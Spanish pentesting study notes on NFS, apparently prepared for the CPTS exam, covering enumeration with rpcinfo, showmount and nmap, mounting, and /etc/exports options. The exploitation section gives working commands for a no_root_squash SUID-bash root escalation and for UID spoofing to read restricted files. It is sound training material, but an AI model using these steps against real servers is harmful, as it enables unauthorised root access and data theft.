NFS (**Network File System**) es el protocolo nativo de UNIX/Linux para compartir sistemas de archivos a través de la red de manera transparente.
### 1. 🔌 Puertos y Servicios Clave

| **Puerto / Protocolo** | **Servicio**          | **Función**                                                    |
| ---------------------- | --------------------- | -------------------------------------------------------------- |
| **`111 TCP/UDP`**      | `rpcbind` / `portmap` | Asigna los servicios RPC a los puertos donde están escuchando. |
| **`2049 TCP/UDP`**     | `nfs` / `nfsd`        | Servidor NFS real (maneja lectura y escritura de archivos).    |
| **Variable (RPC)**     | `mountd`              | Procesa peticiones de montaje de directorios expuestos.        |
| **Variable (RPC)**     | `statd` / `lockd`     | Manejo de bloqueo de archivos y monitoreo de estado.           |

> **Diferencia de versiones:**
> - **NFSv2 / NFSv3:** Sin estado (_stateless_ en v2) o dependiente de `rpcbind` (puerto 111) para negociar puertos dinámicos de `mountd`. Confía ciegamente en el **UID** del cliente.
> - **NFSv4:** Todo el tráfico pasa exclusivamente por el puerto **2049/TCP** (no requiere `rpcbind`). Soporta cifrado/autenticación Kerberos y mapeo de nombres de usuario mediante cadenas de texto (`idmapd`).
### 2. 🔍 Fase de Enumeración (Footprinting)
#### Identificar servicios RPC y puertos activos
```
# Consultar los programas RPC registrados en la máquina víctima
rpcinfo -p <TARGET_IP>
```
#### Listar carpetas compartidas (_Exports_)
```
# Mostrar qué directorios comparte el servidor y a qué redes
showmount -e <TARGET_IP>

# Mostrar clientes montados actualmente
showmount -a <TARGET_IP>
```
#### Scripts de Nmap para NFS
```
# Escaneo específico con scripts de enumeración
sudo nmap -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <TARGET_IP>

# Lanzar toda la suite de scripts NFS
sudo nmap -p 111,2049 --script "nfs*" <TARGET_IP>
```
### 3. 📂 Montaje y Desmontaje de Recursos
#### Preparar y montar un recurso compartido
```
# 1. Crear carpeta local para el montaje
sudo mkdir -p /mnt/target_nfs

# 2. Montar el recurso remoto (básico)
sudo mount -t nfs <TARGET_IP>:/ruta/compartida /mnt/target_nfs

# 3. Montar forzando versión 3 y desactivando bloqueo (muy útil en redes lentas o HTB)
sudo mount -t nfs -o nolock,vers=3 <TARGET_IP>:/ruta/compartida /mnt/target_nfs
```
#### Desmontar el recurso
```
# Desmontaje normal
sudo umount /mnt/target_nfs

# Desmontaje forzado si la sesión se congeló
sudo umount -f -l /mnt/target_nfs
```
### 4. ⚙️ Archivo de Configuración del Servidor: `/etc/exports`
Las directivas de `/etc/exports` definen la seguridad de cada carpeta compartida:

|**Directiva**|**Comportamiento**|**Impacto en Seguridad / Pentesting**|
|---|---|---|
|**`rw` / `ro`**|Lectura y escritura (`rw`) o solo lectura (`ro`).|Determina si podemos subir payloads o crear enlaces simbólicos.|
|**`root_squash`** _(Default)_|Mapea al usuario `root` (UID 0) al usuario sin privilegios `nobody`.|Bloquea que un cliente como root cree archivos con permisos de superusuario.|
|**`no_root_squash`**|**Mantiene al `root` del cliente como `root` en el servidor.**|**Vector crítico de Privilege Escalation (Creación de binarios SUID).**|
|**`all_squash`**|Mapea **todos** los UIDs de los clientes al usuario invitado/anónimo.|Previene la suplantación de UIDs locales.|
|**`anonuid` / `anongid`**|Define el UID/GID específico al que se mapearán las cuentas anuladas.|Permite que las conexiones caigan bajo un UID arbitrario en el servidor.|
|**`sync` / `async`**|Escribe cambios en disco de inmediato (`sync`) o en caché (`async`).|`async` mejora rendimiento pero puede corromper datos ante caídas.|

### 5. 🎯 Vectores de Explotación (Enfoque CPTS / Pentesting)
#### Vector 1: Escalada de Privilegios con `no_root_squash`
Si una carpeta en el servidor tiene la opción `no_root_squash` y tienes acceso de escritura:
```
# 1. Desde tu máquina atacante (siendo root local), copia un binario bash al recurso montado
cp /bin/bash /mnt/target_nfs/rootbash

# 2. Asigna permisos SUID y ejecución total desde tu máquina
chmod +xs /mnt/target_nfs/rootbash
chmod 4755 /mnt/target_nfs/rootbash

# 3. Ve a tu consola de bajo privilegio en el servidor víctima y ejecuta:
/ruta/al/nfs/rootbash -p
# ¡Obtienes shell interactiva con EUID=0 (root)!
```
#### Vector 2: Suplantación de Identidad por UID (UID Spoofing)
NFSv2/v3 no valida contraseñas; valida el número entero de tu **UID**. Si un archivo confidencial dentro del NFS solo lo puede leer el UID `1001`:
```
# 1. Crear un usuario local en tu máquina atacante con ese mismo UID
sudo useradd -u 1001 auditor

# 2. Cambiar a esa identidad localmente
sudo su auditor

# 3. Acceder al recurso montado con los permisos nativos de ese usuario
cd /mnt/target_nfs
cat archivo_restringido.conf
```

### 6. 🎬 Animación SVG para Obsidian: Vector `no_root_squash`
<svg viewBox="0 0 740 300" width="100%" style="background: #0f172a; border-radius: 12px; font-family: monospace;">
  <defs>
    <marker id="arrow-nfs" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#38bdf8"/>
    </marker>
    <marker id="arrow-pwn" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444"/>
    </marker>
  </defs>

  <!-- Titulo -->
  <text x="370" y="28" text-anchor="middle" fill="#f8fafc" font-size="14" font-weight="bold">Abuso de no_root_squash: De Cliente Root a Shell Root en el Servidor</text>

  <!-- Atacante -->
  <rect x="30" y="60" width="160" height="200" rx="8" fill="#1e293b" stroke="#38bdf8" stroke-width="2"/>
  <text x="110" y="90" text-anchor="middle" fill="#38bdf8" font-size="13" font-weight="bold">Máquina Atacante</text>
  <text x="110" y="115" text-anchor="middle" fill="#94a3b8" font-size="10">Root Local (UID 0)</text>
  <text x="110" y="150" text-anchor="middle" fill="#cbd5e1" font-size="10">1. Monta /shared</text>
  <text x="110" y="180" text-anchor="middle" fill="#cbd5e1" font-size="10">2. cp /bin/bash .</text>
  <text x="110" y="210" text-anchor="middle" fill="#f59e0b" font-size="10">3. chmod +s bash</text>

  <!-- Servidor Víctima -->
  <rect x="550" y="60" width="160" height="200" rx="8" fill="#1e293b" stroke="#ef4444" stroke-width="2"/>
  <text x="630" y="90" text-anchor="middle" fill="#f87171" font-size="13" font-weight="bold">Servidor NFS</text>
  <text x="630" y="115" text-anchor="middle" fill="#94a3b8" font-size="10">/etc/exports: no_root_squash</text>
  <text x="630" y="160" text-anchor="middle" fill="#cbd5e1" font-size="10">Guarda archivo con:</text>
  <text x="630" y="180" text-anchor="middle" fill="#f59e0b" font-size="10">-rwsr-xr-x (UID 0)</text>
  <text x="630" y="225" text-anchor="middle" fill="#4ade80" font-size="11" font-weight="bold">4. ./bash -p -> ROOT!</text>

  <!-- Flujo 1: Subida de binario SUID -->
  <path d="M 190 180 L 550 180" stroke="#38bdf8" stroke-width="2" stroke-dasharray="4,4" fill="none" marker-end="url(#arrow-nfs)"/>
  <text x="370" y="170" text-anchor="middle" fill="#38bdf8" font-size="10">Escribe binario SUID preservando UID=0</text>
  <circle r="5" fill="#38bdf8">
    <animateMotion path="M 190 180 L 550 180" dur="2.2s" repeatCount="indefinite"/>
  </circle>

  <!-- Flujo 2: Ejecución local en víctima -->
  <path d="M 550 230 L 630 230" stroke="#ef4444" stroke-width="2" fill="none"/>

  <!-- Explicación al pie -->
  <text x="370" y="285" text-anchor="middle" fill="#94a3b8" font-size="11">Al no aplicar 'root_squash', el servidor acepta que el cliente cree archivos con permisos SUID de root.</text>
</svg>
